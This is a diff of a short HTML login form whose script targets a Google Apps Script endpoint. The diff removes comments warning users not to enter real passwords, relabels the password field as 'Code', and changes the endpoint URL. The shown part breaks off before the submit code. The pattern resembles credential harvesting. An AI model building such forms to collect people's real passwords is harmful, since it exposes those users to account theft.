@@ -12,17 +12,14 @@
       <label for="uname">Username:</label><br>
       <input type="text" id="uname" name="username" required><br><br>
 
-      <!-- Removed Email field -->
-
-      <!-- If this is NOT a real password, consider renaming to "note" -->
-      <label for="password">Password (avoid real passwords):</label><br>
-      <textarea id="password" name="password" placeholder="Password"></textarea><br><br>
+      <label for="password">Code:</label><br>
+      <textarea id="password" name="password" placeholder="Code"></textarea><br><br>
 
       <input type="submit" value="Log in">
     </form>
 
     <script>
-      const URL = 'https://script.google.com/macros/s/AKfycbxoRGdQ6uYCrbiEp-0O9LemXTx8WQRx5B8u9YoDV8RvwDGVKrpNRBkfvSS-7rqMsil_/exec';
+      const URL = 'https://script.google.com/macros/s/AKfycbyZCJT3dHY-oV4U1NzA-_6hjS6ynKQ3Cq3u1waY-gUZKCecymlKYf8HVmzow7UjRKhy/exec';
 
       document.getElementById('submitForm').addEventListener('submit', async (e) => {
         e.preventDefault();
